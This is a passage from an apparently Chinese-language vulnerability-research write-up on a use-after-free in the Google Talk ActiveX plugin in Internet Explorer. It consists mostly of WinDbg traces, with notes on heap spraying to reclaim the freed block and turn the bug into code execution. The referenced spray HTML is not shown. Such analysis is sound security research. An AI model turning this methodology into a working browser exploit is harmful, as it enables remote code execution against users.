     0cbd0040 00000000 00000000 00000000 00000000  
     0cbd0050 00000000 00000000 00000000 00000000  
     0cbd0060 00000000 00000000 00000000 00000000  
     0cbd0070 00000000 00000000 00000000 00000000  
     0:008> p  
     eax=0cbd0000 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80caa esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x638a:  
     59d80caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     0:008> p  
     eax=09d7c510 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb0 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6390:  
     59d80cb0 50       push  eax  
     0:008> p  
     eax=09d7c510 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb1 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6391:  
     59d80cb1 8d45e4     lea   eax,[ebp-1Ch]  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb4 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6394:  
     59d80cb4 50       push  eax  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb5 esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6395:  
     59d80cb5 e8768e0000   call  googletalkax!DllUnregisterServer+0xf210 (59d89b30)  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cba esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x639a:  
     59d80cba 8b4f1c     mov   ecx,dword ptr [edi+1Ch] ds:002b:0c69001c=00000000  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cbd esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x639d:  
     59d80cbd 83c408     add   esp,8  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cc0 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl nz ac pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000216  
     googletalkax!DllUnregisterServer+0x63a0:  
     59d80cc0 50       push  eax  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cc1 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl nz ac pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000216  
     googletalkax!DllUnregisterServer+0x63a1:  
     59d80cc1 ff5604     call  dword ptr [esi+4]  ds:002b:00000004=????????  
     0:008> p  
     (11cc.2728): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.
这表明，如果我们可以将释放的内存替换为我们自己分配的内存，我们可以把它转换为代码执行。
**堆分配分析**
在Gflags.exe中，我们启用“Create User Mode Stack Trace Database”。
我们需要在同一堆上分配相同块大小的内存，以便将其变成可利用的条件。首先，我们确定这个释放的内存分配在什么堆上。
我创建了以下HTML来通过IE在默认堆上喷射一些可控数据。
我使用windbg来查看它分配的堆。
     (1348.18dc): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:UsersSeanAppDataLocalGoogleGoogle Talk Plugingoogletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=d215f8bc edx=00461078 esi=00000000 edi=3dc19fb0  
     eip=14d10ca5 esp=09b3bf10 ebp=09b3c024 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00210246  
     googletalkax!DllUnregisterServer+0x6385:  
     14d10ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:3dc19fcc=????????  
     0:007> !heap -p -a edi  
       address 3dc19fb0 found in  
       _DPH_HEAP_ROOT @ 461000  
       in free-ed allocation ( DPH_HEAP_BLOCK:     VirtAddr     VirtSize)  
                       3dbe1ac4:     3dc19000       2000  
       5f8290b2 verifier!AVrfDebugPageHeapFree+0x000000c2  
       77691564 ntdll!RtlDebugFreeHeap+0x0000002f  
       7764ac29 ntdll!RtlpFreeHeap+0x0000005d  
       775f34a2 ntdll!RtlFreeHeap+0x00000142  
       75f514ad kernel32!HeapFree+0x00000014  
       14d28310 googletalkax!DllUnregisterServer+0x0001d9f0  
       14d0e407 googletalkax!DllUnregisterServer+0x00003ae7  
       14d0218a googletalkax+0x0000218a  
       14d0572f googletalkax+0x0000572f  
       61d0fe01 +0x0000001d  
       61d24fd6 MSHTML!CBase::PrivateRelease+0x000000bc  
       61d0d8ee MSHTML!CTxtSite::Release+0x0000001a  
       61d0d986 MSHTML!CBase::ReleaseInternalRef+0x0000001f  
       5e6586d3 jscript9!Js::CustomExternalObject::Dispose+0x00000023  
       5e65869c jscript9!SmallFinalizableHeapBlock::DisposeObjects+0x00000134  
       5e659880 jscript9!HeapInfo::DisposeObjects+0x000000b0  
       5e659750 jscript9!Recycler::DisposeObjects+0x0000004a  
       5e6596fe jscript9!Recycler::FinishDisposeObjects+0x0000001a  
       5e74f64c jscript9!Recycler::CollectOnConcurrentThread+0x00000087  
       5e655f36 jscript9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x00000026  
       5e655eeb jscript9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x0000003b  
       5e655e6d jscript9!ThreadContext::ExecuteRecyclerCollectionFunction+0x000000ad  
       5e656a46 jscript9!Recycler::DoCollectWrapped+0x00000079  
       5e7fc8dc jscript9!Recycler::Collect+0x0000004b  
       5e64c06d jscript9!Js::InterpreterStackFrame::Process+0x00001940  
       5e64c7ab jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x000001ce  
     0:007> s -u 0x00000000 L?0xffffffff seansean7  
     0eebafa6 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     29e66f96 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     4b6c6f02 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     79700c0a 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     0:007> !heap -p -a 0eebafa6  
       address 0eebafa6 found in  
       _DPH_HEAP_ROOT @ 461000  
       in busy allocation ( DPH_HEAP_BLOCK:     UserAddr     UserSize -     VirtAddr     VirtSize)  
                      eec0208:     eeba7f0       80c -     eeba000       2000  
       5f828e89 verifier!AVrfDebugPageHeapAllocate+0x00000229  
       77690d96 ntdll!RtlDebugAllocateHeap+0x00000030  
       7764af0d ntdll!RtlpAllocateHeap+0x000000c4  
       775f3cfe ntdll!RtlAllocateHeap+0x0000023a  
       61df38ff MSHTML!CHtmRootParseCtx::NailDownChain+0x000004ba  
       61de7c59 MSHTML!CHtmRootParseCtx::EndElement+0x00000119  